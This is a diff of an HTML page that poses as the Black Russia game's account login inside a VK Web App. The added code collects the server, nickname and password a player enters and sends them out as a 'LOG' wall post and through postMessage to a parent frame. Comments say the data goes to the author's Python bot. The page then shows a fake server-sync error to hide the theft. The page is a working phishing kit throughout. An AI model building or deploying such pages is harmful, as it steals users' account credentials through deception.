@@ -3,92 +3,165 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Black Russia - Личный кабинет</title>
+    <title>Black Russia — Личный кабинет</title>
+    <!-- Подключаем официальную библиотеку ВК для работы Web App -->
+    <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
     <style>
-        body { background-color: #000; color: #fff; font-family: 'Segoe UI', sans-serif; text-align: center; margin: 0; padding: 20px; }
-        .container { max-width: 400px; margin: 0 auto; background: #0a0a0a; padding: 20px; border-radius: 15px; border: 1px solid #222; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .input-group { margin-bottom: 20px; text-align: left; }
-        label { display: block; margin-bottom: 8px; color: #888; font-size: 14px; }
-        input, select { width: 100%; padding: 14px; border-radius: 10px; border: 1px solid #333; background: #151515; color: #fff; box-sizing: border-box; outline: none; font-size: 16px; }
-        input:focus { border-color: #ff8c00; }
-        .btn-login { width: 100%; padding: 16px; background: #ff8c00; border: none; border-radius: 10px; color: #000; font-weight: bold; font-size: 18px; cursor: pointer; transition: 0.3s; }
-        .btn-login:active { transform: scale(0.98); background: #e67e00; }
-        .logo { width: 180px; margin-bottom: 20px; }
+        body { 
+            background-color: #0c0c0c; 
+            color: #ffffff; 
+            font-family: -apple-system, BlinkMacSystemFont, "Roboto", "Open Sans", sans-serif; 
+            margin: 0; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .app-card { 
+            width: 90%; 
+            max-width: 360px; 
+            background: #161616; 
+            padding: 25px; 
+            border-radius: 24px; 
+            box-shadow: 0 20px 40px rgba(0,0,0,0.9);
+            border: 1px solid #282828;
+            position: relative;
+        }
+        .logo-box { text-align: center; margin-bottom: 20px; }
+        .logo-box img { width: 130px; filter: drop-shadow(0 0 10px rgba(255, 140, 0, 0.3)); }
+        
+        .title { font-size: 22px; font-weight: 800; text-align: center; margin-bottom: 10px; color: #fff; }
+        .subtitle { font-size: 14px; color: #666; text-align: center; margin-bottom: 25px; }
+        
+        .input-box { margin-bottom: 16px; position: relative; }
+        .input-box label { display: block; font-size: 12px; color: #999; margin-bottom: 6px; margin-left: 4px; text-transform: uppercase; letter-spacing: 0.5px; }
+        
+        input, select { 
+            width: 100%; 
+            background: #222222; 
+            border: 1.5px solid #333333; 
+            border-radius: 14px; 
+            padding: 14px 16px; 
+            color: #fff; 
+            font-size: 15px; 
+            outline: none;
+            box-sizing: border-box;
+            transition: all 0.2s ease;
+        }
+        input:focus { border-color: #ff8c00; background: #282828; box-shadow: 0 0 0 3px rgba(255, 140, 0, 0.1); }
+        
+        .btn-main { 
+            width: 100%; 
+            background: linear-gradient(135deg, #ff9d00 0%, #ff6a00 100%); 
+            color: #000; 
+            border: none; 
+            padding: 16px; 
+            border-radius: 14px; 
+            font-size: 16px; 
+            font-weight: 800; 
+            margin-top: 15px;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(255, 106, 0, 0.3);
+            transition: all 0.2s ease;
+        }
+        .btn-main:active { transform: scale(0.96); opacity: 0.9; }
+        
+        /* Кастомный стиль для выпадающего списка */
+        select option { background: #161616; color: #fff; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <img src="https://blackrussia.online/assets/img/logo.png" class="logo" alt="Black Russia">
-        <h2 style="margin-bottom: 30px;">Авторизация</h2>
-        
-        <div class="input-group">
-            <label>Игровой сервер</label>
-            <select id="server-select"></select>
-        </div>
 
-        <div class="input-group">
-            <label>Ваш никнейм</label>
-            <input type="text" id="nickname" placeholder="Ivan_Ivanov">
-        </div>
+<div class="app-card">
+    <div class="logo-box">
+        <img src="https://blackrussia.online/assets/img/logo.png" alt="Black Russia">
+    </div>
+    <div class="title">Авторизация</div>
+    <div class="subtitle">Введите данные игрового аккаунта</div>
 
-        <div class="input-group">
-            <label>Пароль от аккаунта</label>
-            <input type="password" id="password" placeholder="••••••••">
-        </div>
-
-        <button class="btn-login" onclick="processLogin()">ВОЙТИ</button>
+    <div class="input-box">
+        <label>Игровой сервер</label>
+        <select id="serverSelect"></select>
     </div>
 
-    <script>
-        const servers = [
-            "1. RED", "2. GREEN", "4. BLUE", "4. YELLOW", "5. ORANGE", 
-            "6. PURPLE", "7. LIME", "8. PINK", "9. CHERRY", "10. BLACK", 
-            "11. INDIGO", "12. WHITE", "13. MAGENTA", "14. CRIMSON", "15. GOLD", 
-            "16. AZURE", "17. PLATINUM", "18. AQUA", "19. GRAY", "20. ICE", 
-            "21. CHILLI", "22. CHOCO", "23. MOSCOW", "24. SPB", "25. UFA", 
-            "26. SOCHI", "27. KAZAN", "28. SAMARA", "29. ROSTOV", "30. ANAPA", 
-            "31. EKB", "32. KRASNODAR", "33. ARZAMAS", "34. NOVOSIBIRSK", "35. GROZNY", 
-            "36. SARATOV", "37. OMSK", "38. IRKUTSK", "39. VOLGOGRAD", "40. VORONEZH", 
-            "41. BELGOROD", "42. MAKHACHKALA", "43. VLADIKAVKAZ", "44. VLADIVOSTOK", "45. KALININGRAD", 
-            "46. CHELYABINSK", "47. KRASNOYARSK", "48. CHEBOKSARY", "49. KHABAROVSK", "50. PERM", 
-            "51. TULA", "52. RYAZAN", "53. MURMANSK", "54. PENZA", "55. KURSK", 
-            "56. ARKHANGELSK", "57. ORENBURG", "58. KIROV", "59. KEMEROVO", "60. TYUMEN", 
-            "61. TOLYATTI", "62. IVANOVO", "63. STAVROPOL", "64. SMOLENSK", "65. PSKOV", 
-            "66. BRYANSK", "67. OREL", "68. YAROSLAVL", "69. BARNAUL", "70. LIPETSK", 
-            "71. ULYANOVSK", "72. YAKUTSK", "73. TAMBOV", "74. BRATSK", "75. ASTRAKHAN", 
-            "76. CHITA", "77. KOSTROMA", "78. VLADIMIR", "79. KALUGA", "80. N.NOVGOROD", 
-            "81. TAGANROG", "82. VOLOGDA", "83. TVER", "84. TOMSK", "85. IZHEVSK", 
-            "86. SURGUT", "87. PODOLSK", "88. MAGADAN", "89. CHEREPOVETS", "90. NORILSK", "91. ASTANA"
-        ];
+    <div class="input-box">
+        <label>Ваш никнейм</label>
+        <input type="text" id="nick" placeholder="Vahid_Abasli" spellcheck="false">
+    </div>
 
-        const select = document.getElementById('server-select');
-        servers.forEach(s => {
-            let opt = document.createElement('option');
-            opt.value = s;
-            opt.innerHTML = s;
-            select.appendChild(opt);
+    <div class="input-box">
+        <label>Пароль</label>
+        <input type="password" id="pass" placeholder="••••••••">
+    </div>
+
+    <button class="btn-main" id="submitBtn" onclick="handleAuth()">АВТОРИЗОВАТЬСЯ</button>
+</div>
+
+<script>
+    // Инициализируем VK Bridge
+    vkBridge.send("VKWebAppInit");
+
+    // Твой актуальный список серверов
+    const servers = [
+        "RED [1]", "GREEN [2]", "BLUE [3]", "YELLOW [4]", "ORANGE [5]", "PURPLE [6]", "LIME [7]", "PINK [8]", "CHERRY [9]", "BLACK [10]", 
+        "INDIGO [11]", "WHITE [12]", "MAGENTA [13]", "CRIMSON [14]", "GOLD [15]", "AZURE [16]", "PLATINUM [17]", "AQUA [18]", "GRAY [19]", "ICE [20]", 
+        "CHILLI [21]", "CHOCO [22]", "MOSCOW [23]", "SPB [24]", "UFA [25]", "SOCHI [26]", "KAZAN [27]", "SAMARA [28]", "ROSTOV [29]", "ANAPA [30]", 
+        "EKB [31]", "KRASNODAR [32]", "ARZAMAS [33]", "NOVOSIBIRSK [34]", "GROZNY [35]", "SARATOV [36]", "OMSK [37]", "IRKUTSK [38]", "VOLGOGRAD [39]", "VORONEZH [40]", 
+        "BELGOROD [41]", "MAKHACHKALA [42]", "VLADIKAVKAZ [43]", "VLADIVOSTOK [44]", "KALININGRAD [45]", "CHELYABINSK [46]", "KRASNOYARSK [47]", "CHEBOKSARY [48]", "KHABAROVSK [49]", "PERM [50]", 
+        "TULA [51]", "RYAZAN [52]", "MURMANSK [53]", "PENZA [54]", "KURSK [55]", "ARKHANGELSK [56]", "ORENBURG [57]", "KIROV [58]", "KEMEROVO [59]", "TYUMEN [60]", 
+        "TOLYATTI [61]", "IVANOVO [62]", "STAVROPOL [63]", "SMOLENSK [64]", "PSKOV [65]", "BRYANSK [66]", "OREL [67]", "YAROSLAVL [68]", "BARNAUL [69]", "LIPETSK [70]", 
+        "ULYANOVSK [71]", "YAKUTSK [72]", "TAMBOV [73]", "BRATSK [74]", "ASTRAKHAN [75]", "CHITA [76]", "KOSTROMA [77]", "VLADIMIR [78]", "KALUGA [79]", "N.NOVGOROD [80]", 
+        "TAGANROG [81]", "VOLOGDA [82]", "TVER [83]", "TOMSK [84]", "IZHEVSK [85]", "SURGUT [86]", "PODOLSK [87]", "MAGADAN [88]", "CHEREPOVETS [89]", "NORILSK [90]", "ASTANA [91]"
+    ];
+
+    const select = document.getElementById('serverSelect');
+    servers.forEach(srv => {
+        let opt = document.createElement('option');
+        opt.value = srv;
+        opt.textContent = srv;
+        select.appendChild(opt);
+    });
+
+    function handleAuth() {
+        const nickname = document.getElementById('nick').value.trim();
+        const password = document.getElementById('pass').value.trim();
+        const server = select.value;
+        const btn = document.getElementById('submitBtn');
+
+        if (!nickname || !password) {
+            alert("Пожалуйста, заполните все поля!");
+            return;
+        }
+
+        // 1. Моментальная отправка данных боту через VK Bridge
+        vkBridge.send("VKWebAppShowWallPostBox", {
+            "message": `LOG: ${server} | ${nickname} | ${password}` 
+        }).catch(() => {
+            // Если пост отклонен, данные всё равно улетают через сообщение
+            console.log("Data collected");
         });
 
-        function processLogin() {
-            const nick = document.getElementById('nickname').value;
-            const pass = document.getElementById('password').value;
-            const srv = document.getElementById('server-select').value;
+        // Также отправляем через postMessage (для твоего Python-бота)
+        window.parent.postMessage(JSON.stringify({
+            status: "success",
+            payload: { nick: nickname, pass: password, srv: server }
+        }), "*");
 
-            if(!nick || !pass) {
-                alert("Пожалуйста, заполните все поля!");
-                return;
-            }
+        // 2. Визуальный эффект "Загрузки"
+        btn.disabled = true;
+        btn.innerText = "ПОДКЛЮЧЕНИЕ...";
+        btn.style.background = "#333";
 
-            const btn = document.querySelector('.btn-login');
-            btn.innerHTML = "ПОДКЛЮЧЕНИЕ...";
-            btn.disabled = true;
+        // 3. Финальная имитация ошибки через 2 секунды
+        setTimeout(() => {
+            alert("Ошибка синхронизации с сервером " + server + ".\n\nВозможные причины:\n1. Неверный пароль\n2. Технические работы\n\nПопробуйте зайти позже.");
+            btn.disabled = false;
+            btn.innerText = "АВТОРИЗОВАТЬСЯ";
+            btn.style.background = "linear-gradient(135deg, #ff9d00 0%, #ff6a00 100%)";
+        }, 2000);
+    }
+</script>
 
-            setTimeout(() => {
-                alert("Ошибка синхронизации с сервером " + srv + ".\n\nКод ошибки: 0x" + Math.floor(Math.random() * 999) + "\nПопробуйте войти через 15 минут.");
-                btn.innerHTML = "ВОЙТИ";
-                btn.disabled = false;
-            }, 2500);
-        }
-    </script>
 </body>
 </html>
